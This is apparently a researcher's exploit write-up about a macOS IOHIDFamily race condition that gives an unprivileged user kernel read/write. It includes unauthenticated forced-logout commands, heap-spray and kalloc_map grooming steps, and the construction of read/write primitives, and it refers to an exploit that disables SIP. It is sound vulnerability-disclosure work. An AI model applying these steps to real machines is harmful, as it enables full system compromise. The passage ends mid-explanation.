_Siguza, 01. Dec 2017_

# IOHIDeous

"IOHIDFamily once again."

## Introduction

This is the tale of a macOS-only vulnerability in IOHIDFamily that yields kernel r/w and can be exploited by any unprivileged user.

IOHIDFamily has been notorious in the past for the many race conditions it contained, which ultimately lead to large parts of it being rewritten to make use of command gates, as well as large parts being locked down by means of entitlements. I was originally looking through its source in the hope of finding a low-hanging fruit that would let me compromise an iOS kernel, but what I didn't know it then is that some parts of IOHIDFamily exist only on macOS - specifically `IOHIDSystem`, which contains the vulnerability discussed herein.

The exploit accompanying this write-up consists of three parts:

-   `poc` (`make poc`)  
    Targets all macOS versions, crashes the kernel to prove the existence of a memory corruption.
-   `leak` (`make leak`)  
    Targets High Sierra, just to prove that no separate KASLR leak is needed.
-   `hid` (`make hid`)  
    Targets Sierra and High Sierra (up to 10.13.1, see [README](https://github.com/Siguza/IOHIDeous/)), achieves full kernel r/w and disables SIP to prove that the vulnerability can be exploited by any unprivileged user on all recent versions of macOS.

Note: The `ioprint` and `ioscan` utilities I'm using in this write-up are available from my [iokit-utils](https://github.com/Siguza/iokit-utils) repository. I'm also using my [hsp4 kext][hsp4] along with [kern-utils](https://github.com/Siguza/ios-kern-utils) to inspect kernel memory.

For any kind of questions or feedback, feel free to hit me up on [Twitter][me] or via mail (`*@*.net` where `*` = `siguza`).

## Technical background

In order to understand the attack surface as well as the vulnerability, you need to know about the involved parts of IOHIDFamily. It starts with the [`IOHIDSystem` class](https://opensource.apple.com/source/IOHIDFamily/IOHIDFamily-1035.1.4/IOHIDSystem/IOHIDSystem.cpp.auto.html) and the UserClients it offers. There are currently three of those:

- `IOHIDUserClient`
- `IOHIDParamUserClient`
- `IOHIDEventSystemUserClient`

(There used to be a fourth, `IOHIDStackShotUserClient`, but that has been commented out for a while now.) Like almost all UserClients in IOHIDFamily these days, `IOHIDEventSystemUserClient` requires an entitlement to be spawned (`com.apple.hid.system.user-access-service`), however the other two do not. `IOHIDParamUserClient` can actually be spawned by any unprivileged process, but of interest to us is `IOHIDUserClient`, arguably the most powerful of the three, which during normal system operation is held by `WindowServer`:

    bash$ ioprint -d IOHIDUserClient
    IOHIDUserClient(IOHIDUserClient): (os/kern) successful (0x0)
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
        <key>IOUserClientCreator</key>
        <string>pid 144, WindowServer</string>
        <key>IOUserClientCrossEndianCompatible</key>
        <true/>
    </dict>
    </plist>

This is an important point because as it turns out, IOHIDSystem restricts the number of `IOHIDUserClient`s that can exist at any given time to exactly one. This is specifically enforced by the `evOpenCalled` class variable, which is set to `true` when an `IOHIDUserClient` is spawned and to `false` again when it is closed. This variable is checked in `IOHIDSystem::evOpen`, which in turn is called from `IOHIDSystem::newUserClientGated` (so we can't even race it).

Bottom line, there can only be one `IOHIDUserClient` at any given moment, and chances are that when your code runs, `WindowServer` will be long up and running with its UserClient already. So snatching that is not straightforward, but we'll get to that later. For now we're gonna look at what it actually uses that UserClient for.

`IOHIDSystem`/`IOHIDUserClient` offer some shared memory for an event queue and certain cursor-related data that `WindowServer` can map into its address space via `clientMemoryForType`. This memory is split into three parts packed after each other in this order:

-   The `EvOffsets` structure.  
    This structs holds information about where the other parts of the shared memory are located in respect to the beginning of the shared memory (so they're given as offsets). The definition is:

    ```c
    typedef volatile struct _evOffsets {
        int evGlobalsOffset;    /* Offset to EvGlobals structure */
        int evShmemOffset;      /* Offset to private shmem regions */
    } EvOffsets;
    ```

-   The `EvGlobals` structure.  
    This is where the event queue and cursor data reside, and this makes up 99% of the shared memory. I'll omit the lengthy declaration here, you can view it in [`IOHIDShared.h`](https://opensource.apple.com/source/IOHIDFamily/IOHIDFamily-1035.1.4/IOHIDSystem/IOKit/hidsystem/IOHIDShared.h.auto.html) or see my annotated version in [`data/evg.c`](https://github.com/Siguza/IOHIDeous/tree/master/data/evg.c).
-   Private driver memory.  
    As far as I can see, this remains unused and has a size of 0 bytes.

In `IOHIDSystem`, the extensively used `EvGlobals` address is assigned to an `evg` class variable, and (even though unused) the address of the private driver memory is similarly assigned to `evs`.

To initialise that memory, `IOHIDSystem` offers a `createShmem` function which `IOHIDUserClient` implements as external method `0`. Like pretty much any IOHIDFamily interface these days, `IOHIDSystem::createShmem` is neatly gated to prevent any concurrent access, and the real implementation resides in `IOHIDSystem::createShmemGated`. On Sierra and earlier that function actually allocated the shared memory if necessary, but since High Sierra (or IOHIDFamily version 1035.1.4) that duty has been shifted to `IOHIDSystem::init`. Regardless, all code paths eventually end up at `IOHIDSystem::initShmem`, which is responsible for cleaning and initialising the actual data structures.

And that's where it gets interesting.

## The vulnerability

This is the beginning of `IOHIDSystem::initShmem`, containing the vulnerability:

```c++
int  i;
EvOffsets *eop;
int oldFlags = 0;

/* top of sharedMem is EvOffsets structure */
eop = (EvOffsets *) shmem_addr;

if (!clean) {
    oldFlags = ((EvGlobals *)((char *)shmem_addr + sizeof(EvOffsets)))->eventFlags;
}

bzero( (void*)shmem_addr, shmem_size);

/* fill in EvOffsets structure */
eop->evGlobalsOffset = sizeof(EvOffsets);
eop->evShmemOffset = eop->evGlobalsOffset + sizeof(EvGlobals);

/* find pointers to start of globals and private shmem region */
evg = (EvGlobals *)((char *)shmem_addr + eop->evGlobalsOffset);
evs = (void *)((char *)shmem_addr + eop->evShmemOffset);
```

Can you spot it? What if I told you that this function can be called when the shared memory is already mapped in the calling task, and that `EvOffsets` is declared as `volatile`? :P

The thing is that between this line:

```c++
eop->evGlobalsOffset = sizeof(EvOffsets);
```

and this one:

```c++
evg = (EvGlobals *)((char *)shmem_addr + eop->evGlobalsOffset);
```

The value of `eop->evGlobalsOffset` can change, which will then cause `evg` to point to somewhere other than intended.

From looking [at the source](https://opensource.apple.com/source/IOHIDFamily/IOHIDFamily-33/IOHIDSystem/IOHIDSystem.cpp.auto.html), this vulnerability seems to have been present at least since as far back as 2002. There also used to be a copyright notice from NeXT Computer, Inc. noting an `EventDriver.m` - such a file is nowhere to be found on the web, but if the vulnerable code came from there and if the dates in the copyright notice are to be trusted, that would put the origin of the bug even 10 years further back (older than myself!), but I don't know that so I'm just gonna assume it came to life in 2002.

## Putting the exploit together

The fun part. :P

### Getting access

Before we can do anything else, we have to look at how we can actually get access to thing we wanna play with, i.e. how we can spawn an `IOHIDUserClient` when `WindowServer` is holding the only available one.

The first option I implemented was to just get `WindowServer`'s task port and "steal" its client with `mach_port_extract_right`. Works like a charm, the only problem is that this requires both you to be root and SIP to be disabled.

The next lower option is to simply `kill -9 WindowServer`. Still requires root, but at least that works with SIP enabled. `WindowServer` goes down, its UserClient gets cleaned up and we have plenty of time to spawn our own. As a side effect, you'll also notice the system's entire graphical interface going down along with `WindowServer` - so we're not exactly stealthy at this point.

I did some more digging and found that `WindowServer` actually lets go of its UserClient for a few seconds when a user logs out - more than enough time for us to grab it. So finally we have something that doesn't require us to run as root, but merely as the currently logged-in user, since we can easily force a logout with:

    launchctl reboot logout

But can we go lower? Can we do this as any unprivileged user? TL;DR: Yes we can!  
First, we can try with some AppleScript trickery. `loginwindow` implements something called "AppleEventReallyLogOut" or "aevtrlgo" for short, which attempts to log the user out without a confirmation dialogue. For reasons of apparent insanity, `loginwindow` does not seem to verify where this event is coming from, so any unprivileged account such as, say, `nobody`, can get away with this:

    osascript -e 'tell application "loginwindow" to «event aevtrlgo»'

Now, it doesn't work quite as flawlessly as the previous method. It acts as if the user had actually chosen to log out via the GUI - which means that apps with unsaved changes can still abort the logout, or at least prompt for confirmation (an example for this is Terminal with a running command). In contrast, `launchctl` just tears down your GUI session without letting anyone say a damn thing. (Another drawback is that we cannot test the success of `aevtrlgo`, since the call returns while the confirmation popup is still active. This seems like a limitation of AppleScript.)

But second, alternatively to a logout, a shutdown or reboot will do as well. This makes for an interesting possibility: we could write a sleeper program and just _wait_ for conditions to become favourable - I have no access to any statistics, but I'd assume most Macs are _eventually_ shut down or rebooted manually, rather than only ever going down as the result of a panic. And if that assumption holds, then our sleeper will get the chance to run and snatch the UserClient it needs.

So in order to maximise our success rate, we do the following:

1. Install signal handlers for `SIGTERM` and `SIGHUP`. This should buy us at least a few seconds after a logout/shutdown/reboot has been initiated.
2. Run `launchctl reboot logout`.
3. If the former failed, run `osascript -e 'tell application "loginwindow" to «event aevtrlgo»'`.
4. Try spawning the desired UserClient repeatedly. Whether we succeeded in logging the user out doesn't matter at this point, we'll just wait for a manual logout/shutdown/reboot if not. So as long as the return value of `IOServiceOpen` is `kIOReturnBusy`, we keep looping.

_This is implemented in [`src/hid/obtain.c`](https://github.com/Siguza/IOHIDeous/tree/master/src/hid/obtain.c) with some parts residing in [`src/hid/main.c`](https://github.com/Siguza/IOHIDeous/tree/master/src/hid/main.c)._

### Triggering the bug

With access secured, we can get to triggering our bug. It's obvious that we _can_ be lucky enough to modify `eop->evGlobalsOffset` just in the right moment - but how likely is that, and what can go wrong? There are three possible outcomes:

- We lose the race, i.e. `evg` is set to what IOHIDFamily intends it to be.
- We win the race, manage to offset `evg`, and `evg` now points to a data structure we placed on the heap.
- We win the race, but `evg` lands in something other than we intended.

The last case will probably cause a panic sooner (unmapped memory) or later (corruption of some data structure). Luckily I've had this happen only very rarely. Because of that, and because we cannot repair any such corruption anyway, we're just gonna focus on the other two cases. The first one is undesirable but unproblematic (we can just try again), and the second one is the one we want. Thanks to the initialisation performed by `IOHIDSystem`, we can even detect which of those happened: first the entire shared memory (using the correct address) is `bzero`'ed, and afterwards many fields are set (with the offset address), some of which hold a constant value `!= 0`. After calling the initialisation routine, we can query any such field and if it holds `0`, `evg` was offset, otherwise it was not. I chose the `version` field in my implementation.

In conclusion:

- In one thread, we just spam a value to `eop->evGlobalsOffset`.
- In another thread, we call the initialisation routine until `evg->version == 0`.

_This is implemented in [`src/hid/exploit.c`](https://github.com/Siguza/IOHIDeous/tree/master/src/hid/exploit.c). A minimal standalone implementation also exists in [`src/poc/main.c`](https://github.com/Siguza/IOHIDeous/tree/master/src/poc/main.c)._

### Shmem basics

Now that we can trigger our memory corruption, what exactly can we do with it? First we'll look at how big of a corruption we can actually cause. `eop->evGlobalsOffset` is of type (signed) `int`, so we can offset `evg` by `INT_MAX` bytes in either direction. That's quite a lot.

Next we'll look at the structure's size. Since it's exported to userland, we can just include an IOKit header and do some `sizeof`:

```c
// gcc -o t t.c -Wall -framework IOKit
#include <stdio.h>
#include <IOKit/hidsystem/IOHIDShared.h>

int main(void)
{
    printf("0x%lx\n", sizeof(EvOffsets) + sizeof(EvGlobals));
    return 0;
}
```

From Sierra 10.12.0 all through High Sierra 10.13.1, that yields `0x5ae8`. That's also quite a lot... in other words, we can slap one monster of a memory structure an entire two gigabytes back and forth through memory (that's what inspired the name "IOHIDeous").

Now, a priori we know neither where this structure resides, nor where any other kernel memory lies in respect to it. So far we only know that it is allocated via an `IOBufferMemoryDescriptor`, which for `kIOMemoryKernelUserShared` goes through `iopa_alloc`, and subsequently maps the memory into the provided task, if any - in this case the `kernel_task`, so the mapping ends up on the `kernel_map`. Knowing its sharing type and (rounded) size, we can easily find it with `kmap`:

    bash$ sudo kmap -e | fgrep 24K | fgrep 'mem tru'
    ffffff8209855000-ffffff820985b000     [  24K] -rw-/-rwx [mem tru cp] 0000000000000000 [0 0 0 0 0] 00000031/823e0c11:<         4> 0,0 {         6,         6} (dynamic)

Running this a couple of times on Sierra yields addresses like:

    ffffff91ec867000
    ffffff91f3ec2000
    ffffff91f48f3000
    ffffff91f6a2c000
    ffffff91f828a000
    ffffff91fc02a000
    ffffff91fe160000
    ffffff91fe6b3000
    ffffff91ffc8a000
    ffffff9209150000
    ffffff92103a8000
    ffffff9211be0000
    ffffff9213141000
    ffffff9215c04000
    ffffff921a2ce000
    ffffff921bf03000

And on High Sierra:

    ffffff8116089000
    ffffff8119735000
    ffffff812a681000
    ffffff81ec925000
    ffffff81efedd000
    ffffff82005cd000
    ffffff820383d000
    ffffff8205531000
    ffffff82096c0000

This doesn't give us much, since these just look like arbitrary locations on the heap. In order to do further statistics, we need to know what we're looking for. It seems extremely unlikely that there would be some structure at a fixed offset from our shared memory, so our best bet is most likely to make a lot of allocations so as to _place_ a certain structure at a fixed offset.

So let's look at where allocations go. The prime kernel memory allocator used by virtually all of IOKit is `kalloc`. Allocations smaller or equal to two page sizes (`0x2000` on x86(_64), `0x8000` on arm(64)), are passed on to `zalloc` with a corresponding `kalloc.X` zone handle. Allocations larger than two page sizes to go the `kalloc_map` first, and if that becomes full, directly to the `kernel_map` (allocations _a lot_ larger than two page sizes go directly to the `kernel_map`, but that doesn't affect us here).  
So we've got two possible targets: the `kalloc_map` and the `kernel_map`.

We'll first look at the `kernel_map` - that is, the entire virtual address space of the kernel. Unlike the zalloc zones, maps employ no freelists, so allocations can happen practically anywhere. However, unless explicitly told not to, the `vm_map_*` functions (through which both `kalloc` and `IOMemoryDescriptor` go) always put allocations in the lowest free address gap large enough for them. This doesn't just mean that it's likely that allocations we make are placed next to each other, but also that our shared memory was mapped in the same manner, and that the further we offset from it, the more likely an address is to still be free (so we could spray there). On Sierra that translates quite nicely into practice, but on High Sierra I found this way barred by the fact that my own allocations would happen at `ffffff92...` addresses while the shared memory resided around `ffffff82...`. I tracked this back mainly to a 64GB large mapping between the two:

    bash$ sudo kmap -e | fgrep '64G'
    ffffff820c115000-ffffff920c355000     [  64G] -rw-/-rwx [map prv cp] ffffff820c115000 [0 0 0 0 0] 0000000e/82656611:<         2> 0,0 {         0,         0} VM compressor

As is evident from its tag, this monster map belongs to the virtual memory compressor. It also exists on Sierra, but there our shared memory sits _after_ it whereas on High Sierra it sits _before_ it. This is most likely the result of `IOHIDSystem` allocating the shared memory in `IOHIDSystem::init` now, which is called much earlier than `IOHIDSystem::createShmem` ever could be. So, `kernel_map`: hot for Sierra, not for High Sierra.

What about the `kalloc_map` then? This is a submap of the `kernel_map` with a fixed size, specifically a 32nd of the physical memory size (i.e. 16GB -> 512MB). On Sierra it is identifiable by its exact size and the fact that it is a `map`, while on High Sierra it even got its own tag:

    bash$ sudo kmap -e | fgrep 'Kalloc'
    ffffff81bca61000-ffffff81dca61000     [ 512M] -rw-/-rwx [map prv cp] ffffff81bca61000 [0 0 0 0 0] 0000000d/66b19131:<         2> 0,0 {         0,         0} Kalloc

Now that address looks like it could well be in range of our shared memory! I've done a couple of probes across reboots, and have sorted them by the distance between the kalloc map and our shared memory, for memory sizes of 8GB and 16GB (the `memsize=N` boot-arg is wicked useful for that):

    10.13 8G
    shmem               kalloc start        kalloc end          start diff          end diff
    ffffff812a681000    ffffff80f0cd4000    ffffff8100cd4000    00000000399ad000    00000000299ad000
    ffffff8116089000    ffffff80dc695000    ffffff80ec695000    00000000399f4000    00000000299f4000
    ffffff8119735000    ffffff80dfd24000    ffffff80efd24000    0000000039a11000    0000000029a11000

    10.13 16G
    shmem               kalloc start        kalloc end          start diff          end diff
    ffffff82096c0000    ffffff81bc97c000    ffffff81dc97c000    000000004cd44000    000000002cd44000
    ffffff8205531000    ffffff81b87ec000    ffffff81d87ec000    000000004cd45000    000000002cd45000
    ffffff82005cd000    ffffff81b37e5000    ffffff81d37e5000    000000004cde8000    000000002cde8000
    ffffff81ec925000    ffffff819fb38000    ffffff81bfb38000    000000004cded000    000000002cded000
    ffffff820383d000    ffffff81b6a48000    ffffff81d6a48000    000000004cdf5000    000000002cdf5000
    ffffff81efedd000    ffffff81a30df000    ffffff81c30df000    000000004cdfe000    000000002cdfe000

Nice, all differences are less than the 2GB we can offset! (Note that the kalloc addresses are lower than the shmem ones, so 1. the differences are negative and 2. we're really lucky to have our offset value `signed`. :P) I've done the same statistics on Sierra as well (see [`data/shmem.txt`](https://github.com/Siguza/IOHIDeous/tree/master/data/shmem.txt)), but there all differences are larger than 64GB (as is to be expected). So on High Sierra we'll go for the `kalloc_map`.

Now that we have our targets set, we can look at how to maximise the chance of landing in a structure sprayed by us. On both maps, allocations usually happen at the lowest possible address, so the higher an address, the less likely it should be to have been previously allocated, i.e. the more likely it should be to be allocated by us.

For Sierra/the `kernel_map` this yields the strategy:

1. Fill the `kalloc_map`.
2. Make >2GB worth of allocations on the `kernel_map`.
3. Offset `evg` by 2GB.
4. Read or corrupt the structure at that offset.

And for High Sierra/the `kalloc_map`:

1. Fill the `kalloc_map`.
2. Offset `evg` by ca. `-0x30000000`.
3. Read or corrupt the structure at that offset.

Notes:

- `sysctlbyname("hw.memsize")` reveals the system memory size, from which the size of the `kalloc_map` can be derived. 
- The value `-0x30000000` is quite arbitrary. In order to land inside the `kalloc_map`, we need a negative offset that is larger than the biggest possible difference between the end of the `kalloc_map` and the beginning of our shared memory, but which is also smaller than the smallest possible difference between the _beginning_ of the `kalloc_map` and the beginning of our shared memory. Ideally it should also be as small as possible, so that we land closer to the end of the map. With biggest and smallest observed differences being `-0x2cdfe000` and `-0x399ad000`, I have chosen `-0x30000000` as a conservative guess. It is most likely possible to derive a more fitting value based on the actual memory size (which seems to affect the differences) by doing a lot more statistics, but I eventually grew tired of rebooting, and `-0x30000000` works just fine for me - you can change `KALLOC_OFFSET_AMOUNT` in [`src/hid/config.h`](https://github.com/Siguza/IOHIDeous/tree/master/src/hid/config.h) if you like a different value better.
- Making 2GB worth of allocations takes well over 10 minutes on my machine, which is longer than I like to wait. I have found that allocating just 768MB and offsetting by a little bit less than that still worked every time for me though. I have added both configurations to [`src/hid/config.h`](https://github.com/Siguza/IOHIDeous/tree/master/src/hid/config.h) with 768MB being the default, and 2GB being selectable through a `-DPLAY_IT_SAFE` compiler flag.

### Reading and writing memory

First of all we have the general problem that we don't know whether offsetting `evg` by a certain amount places it at the _beginning_ of a sprayed memory structure or somewhere in the _middle_ of it. We _do_ know that allocations start at page boundaries though (including our shared memory), are rounded up to a multiple of the page size, and must be bigger than `0x2000`. If nothing else helps, we can spray objects of size `0x3000` and then there will be only three possible offsets: `x`, `x + 0x1000` and `x + 0x2000`. So if we can perform our read or write operation multiple times in sequence, we can just do it three times at all offsets. If we can't do that, at least we still get a 1 in 3 chance of getting it right.

Now, writing memory is quite easy, at least as much as 4 bytes are concerned. `IOHIDSystem::initShmem` takes a single argument `bool clean`, which is `false` if the memory has previously existed already, and which is used as follows:

```c++
int oldFlags = 0;

// ...

if (!clean) {
    oldFlags = ((EvGlobals *)((char *)shmem_addr + sizeof(EvOffsets)))->eventFlags;
}

// ...

evg->eventFlags = oldFlags;
```

So writing 4 bytes is a simple as:

1. Put our data in `eventFlags`.
2. Offset `evg`.

And we have our 4 bytes copied. (Note that `shmem_addr` is used as source rather than `evg`, so we cannot copy anything other than the true `eventFlags`.) Of course the other few dozen kilobytes of memory belonging to the structure are quite a an obstacle if we want to rewrite pointers, as they threaten to lay waste to everything in the vicinity. It turns out that there are quite a lot of gaps though which are left untouched by initialisation and if special care is taken, this method can actually suffice. (Note that the call to `bzero` in `initShmem` also uses `shmem_addr` as argument rather than `evg`, so it does no harm either to the memory we offset to.)

_This is implemented in [`src/hid/exploit.c`](https://github.com/Siguza/IOHIDeous/tree/master/src/hid/exploit.c)._

For reading memory it is kind of a fundamental requirement though that we don't destroy the target structure, and the same could also still prove very useful for writing. With initialisation pretty much out of our control, the only way we can achieve this is if the initialisation of the target memory happens _after_ the initialisation and offsetting of our shared memory. In most cases this means we have to reallocate the target objects after offsetting `evg`, but we could also have a buffer that is (re-)filled long after its allocation. The general idea is:

1. Make a lot of kalloc allocations using objects whose corruption has no bad consequence (e.g. buffers).
2. Offset `evg`.
3. Reallocate the memory intersecting `evg` (possibly using different objects).
4. Perform some read or write operation (we'll get to that in a bit).

Point 3 is a bit tricky to pull off, since there is no general way of telling which objects exactly intersect with `evg`. A naive implementation would just reallocate _all_ sprayed objects - which works, but has terrible performance. So, it's time for some heap feng shui! The `IOSurface` API offers a way to "attach CF property list types to an IOSurface buffer" - more precisely, you can store arbitrarily many results of `OSUnserializeXML` in kernelland, as well as read those back or delete them at any time. Seems like freaking made for our cause! Using that, we can do the following:

1. Create an `IOSurface`.
2. Spray the heap by attaching lots of `OSString`s to the surface.
3. Offset `evg`.
4. Read back the stored strings.
5. Detect where `evg` initialisation happened.
6. Possibly reposition `evg` for alignment.
7. Free the intersecting string(s).
8. Reallocate the memory with a useful data structure.
9. Read from or write to that structure.

Two notes regarding the use of `OSString`:

1. I would've used `OSData`, but it turns out that one has been changed to use `kmem_alloc(kernel_map)` rather than `kalloc` for allocations larger than one page. In other words, `OSData` buffers will never go to the `kalloc_map` anymore.
2. The serialised format of an `OSString` does not contain a null terminator (unlike `OSSymbol`), however one is added when instantiating/unserialising it. Thus to occupy `N` bytes, the serialised length has to actually be `N-1`.

And a note regarding `IOSurface` properties: the exported API only supports CF objects, but for fine-grained control over the data we send as well as for increased performance, I want to use the binary data format directly. For that I go through IOKit functions rather than IOSurface ones, which involves four external method invocations on an `IOSurfaceRootUserClient`:

-   External method `0`.  
    This creates a new `IOSurface`. As struct input it takes serialised plist properties that specify the surface's attributes (same as what you'd pass to `IOSurfaceCreate`) and as struct output it returns some data of which I only know that it contains an identifier at offset `0x10`. The kernel declares this output as having a max size of `0x6c8` bytes, so I just use this construct:
    
    ```c
    union
    {
        char _padding[0x6c8];
        struct
        {
            mach_vm_address_t _pad[2];
            uint32_t id;
        } data;
    } surface;
    ```
    
    Whether that field is truly the surface's ID I don't know, but we have to pass that value to other functions later in order to specify the surface we wanna operate on.
-   External method `9`.  
    This attaches a single property with a name to a surface. As struct input it takes serialised plist data, except that they're prefixed with an 8-byte header where the first 4 bytes are the "ID" from above, and the remaining 4 bytes are likely just padding. The property and its name are expected to be contained in a top-level array, with the property being at index `0` and the name at index `1`. It has a 4-byte struct output, but I have no idea what that is.
-   External method `10`.  
    This serialises and retrieves either a single named property, or all properties if no name is given. As struct input this method takes the same header as before, but instead of serialised plist data it just takes the property's name as null-terminated C string. As struct output it returns the serialised property (or properties) in binary format.
-   External method `11`.  
    This deletes a named property. Struct input is the same as for retrieving a property, and struct output is again 4 bytes whose meaning I don't know.

With that settled, let's look at how we can read and write memory after `evg` has been moved already.

Writing is much simpler so I'll do that first. We'll just use `eventFlags` again, since there's such a nice function for it:

```c++
void IOHIDSystem::updateEventFlagsGated(unsigned flags, OSObject * sender __unused)
{
    if(eventsOpen) {
        evg->eventFlags = (evg->eventFlags & ~KEYBOARD_FLAGSMASK) | (flags & KEYBOARD_FLAGSMASK);
        nanoseconds_to_absolutetime(0, &clickTime);
    }
}
```

Unlike most other API functions, this _isn't_ exported as an external method of any UserClient, but is instead handled in `setProperties`:

```c++
IOReturn IOHIDSystem::setProperties(OSObject * properties)
{
    OSDictionary *  dict;
    IOReturn        ret = kIOReturnSuccess;
  
    dict = OSDynamicCast(OSDictionary, properties);
    if(dict) {
        // ...
        OSNumber *modifiersValue = OSDynamicCast(OSNumber, dict->getObject(kIOHIDKeyboardGlobalModifiersKey));
        if(modifiersValue) {
            updateEventFlags(modifiersValue->unsigned32BitValue());
            return ret;
        }
        // ...
    }
    // ...
    return ret;
}
```

`updateEventFlags` does some indirection through an event queue as well as a command gate, but ultimately arrives at `updateEventFlagsGated`, and `kIOHIDKeyboardGlobalModifiersKey` is just the string `"HIDKeyboardGlobalModifiers"`, so that call is simple enough to do. One thing remains though, how much does that bitmasking in `updateEventFlagsGated` restrain us? `KEYBOARD_FLAGSMASK` is the OR-product of a lot of other constants:

```c
#define KEYBOARD_FLAGSMASK \
        (NX_ALPHASHIFTMASK | NX_SHIFTMASK | NX_CONTROLMASK | NX_ALTERNATEMASK \
        | NX_COMMANDMASK | NX_NUMERICPADMASK | NX_HELPMASK | NX_SECONDARYFNMASK \
        | NX_DEVICELSHIFTKEYMASK | NX_DEVICERSHIFTKEYMASK | NX_DEVICELCMDKEYMASK \
        | NX_ALPHASHIFT_STATELESS_MASK | NX_DEVICE_ALPHASHIFT_STATELESS_MASK \
        | NX_DEVICERCMDKEYMASK | NX_DEVICELALTKEYMASK | NX_DEVICERALTKEYMASK \
        | NX_DEVICELCTLKEYMASK | NX_DEVICERCTLKEYMASK)
```

I've created a separate program in [`data/flags.c`](https://github.com/Siguza/IOHIDeous/tree/master/data/flags.c) to print that constant, which gave me a value of `0x01ff20ff`. That looks too restrictive to actually _write_ arbitrary pointers or data, but considering the fact that `evg->eventFlags & ~KEYBOARD_FLAGSMASK` is retained, it might just be enough to _modify_ something existing in a useful way.

Now onto reading! This one is a fair bit trickier because most code that reads from `evg` either doesn't export that data elsewhere (which makes sense, since the client should have access to it through shared memory already), or it is ridiculously hard to trigger. For example, a call to `evDispatch` can cause the upper 24 bits of each the `x` and `y` components of `evg->screenCursorFixed` to be copied to the shared memory of an `IOFramebuffer`. That shared memory is readily accessible to us through the `IOFramebufferSharedUserClient`, however in order for the values to actually be copied there, the frame buffer need to have been previously attached to `IOHIDSystem` via a call to `IOHIDUserClient::connectClient`, `evg->frame` (which we don't control) has to be between `0` and `3` (inclusive), the cursor has to be on the screen represented by the `IOFramebuffer`, and `evDispatch` actually has to be called. All in all, hardly ideal.

There is one thing though that reads from and, as it happens, also writes to `evg`: `_cursorHelper`. This instance of `IOHIDSystemCursorHelper` is used for both coordinate system arithmetic as well as conversion between the fields `evg->cursorLoc`, `evg->screenCursorFixed` and `evg->desktopCursorFixed`. What's important for us is that is has its own separate storage, so it can act as a cache to some extent. If we can use that to read a value from `evg` at one time and write it back at another, we can copy small amounts of memory to the actual shared memory we have mapped in our task. Now, the "writing back" part is easy enough, if we just look at `IOHIDSystem::initShmem`:

```c++
evg->cursorLoc.x = _cursorHelper.desktopLocation().xValue().as32();
evg->cursorLoc.y = _cursorHelper.desktopLocation().yValue().as32();
evg->desktopCursorFixed.x = _cursorHelper.desktopLocation().xValue().asFixed24x8();
evg->desktopCursorFixed.y = _cursorHelper.desktopLocation().yValue().asFixed24x8();
evg->screenCursorFixed.x = _cursorHelper.getScreenLocation().xValue().asFixed24x8();
evg->screenCursorFixed.y = _cursorHelper.getScreenLocation().yValue().asFixed24x8();
```

As for reading, we've got three candidates:

-   `evg->screenCursorFixed` is only read to be sent to `IOFramebuffer`, otherwise it's only ever written, so it's useless to us.
-   `evg->desktopCursorFixed` is only read from in `IOHIDSystem::_setCursorPosition` if `!(cursorCoupled || external)` (any externally triggered call will have `external = true`) and in `IOHIDSystem::resetCursor` if `evg->updateCursorPositionFromFixed` is true (which we don't control if `evg` is offset).
-   `evg->cursorLoc`, at last, is actually useful: it is passed to `setCursorPosition`, where it is stored unchanged in `_cursorHelper`:
    ```c++
    void IOHIDSystem::setCursorPosition(IOGPoint * newLoc, bool external, OSObject * sender)
    {
        if(eventsOpen == true)
        {
            clock_get_uptime(&_cursorEventLast);
            _cursorHelper.desktopLocationDelta().xValue() += (newLoc->x - _cursorHelper.desktopLocation().xValue());
            _cursorHelper.desktopLocationDelta().yValue() += (newLoc->y - _cursorHelper.desktopLocation().yValue());
            _cursorHelper.desktopLocation().fromIntFloor(newLoc->x, newLoc->y);
            _setCursorPosition(external, false, sender);
            _cursorMoveLast = _cursorEventLast;
            scheduleNextPeriodicEvent();
        }
    }
    ```

Ok, so how can we reach this code path? `setCursorPosition` is called in two places: `unregisterScreenGated` and `setDisplayBoundsGated`. And now this requires some background:  
IOHIDSystem has a notion of virtual screens on which the cursor can be - there are methods to create and destroy such screens, and to set their bounds. All those functions are exported as external methods of `IOHIDUserClient`, meaning they are readily accessible to us. So in order to read 4 bytes from a memory structure, we have to:

1. Register a virtual screen.
2. Allocate an `IOSurface`.
3. Spray the heap by attaching lots of `OSString`s to the surface.
4. Offset `evg`.
5. Read back the stored strings.
6. Detect where `evg` initialisation happened.
7. Possibly reposition `evg` for alignment.
8. Free the intersecting string(s).
9. Reallocate the memory with a useful data structure.
10. Update the bounds of our virtual screen.
11. Re-initialise `evg` back on actual shared memory.
12. Read the copied value off shared memory.

**The cursor problem**

In addition to all that work, we have to take special care of something else: `evg->screenCursorFixed` and `evg->desktopCursorFixed`. Reading from `evg->cursorLoc` may cause these two fields to be written to (that's what I'm calling the **cursor problem**). Specifically, `_setCursorPosition` will be called with `external = true`. First it will reach this point:

```c++
if(OSSpinLockTry(&evg->cursorSema) == 0) { // host using shmem
    // try again later
    return;
}
```

So if `evg->cursorSema` falls on a non-zero value, `_setCursorPosition` will abort and we'll be safe. Otherwise however, we will arrive at the following block of code:

```c++
if ((_cursorHelper.desktopLocation().xValue().asFixed24x8() == evg->desktopCursorFixed.x) &&
    (_cursorHelper.desktopLocation().yValue().asFixed24x8() == evg->desktopCursorFixed.y) &&
    (proximityChange == 0) && (!_cursorHelper.desktopLocationDelta())) {
    cursorMoved = false;    // mouse moved, but cursor didn't
}
else {
    evg->cursorLoc.x = _cursorHelper.desktopLocation().xValue().as32();
    evg->cursorLoc.y = _cursorHelper.desktopLocation().yValue().as32();
    evg->desktopCursorFixed.x = _cursorHelper.desktopLocation().xValue().asFixed24x8();
    evg->desktopCursorFixed.y = _cursorHelper.desktopLocation().yValue().asFixed24x8();
    if (pinScreen >= 0) {
        _cursorHelper.updateScreenLocation(screen[pinScreen].desktopBounds, screen[pinScreen].displayBounds);
    }
    else {
        _cursorHelper.updateScreenLocation(NULL, NULL);
    }
    evg->screenCursorFixed.x = _cursorHelper.getScreenLocation().xValue().asFixed24x8();
    evg->screenCursorFixed.y = _cursorHelper.getScreenLocation().yValue().asFixed24x8();

    // ...
}
```

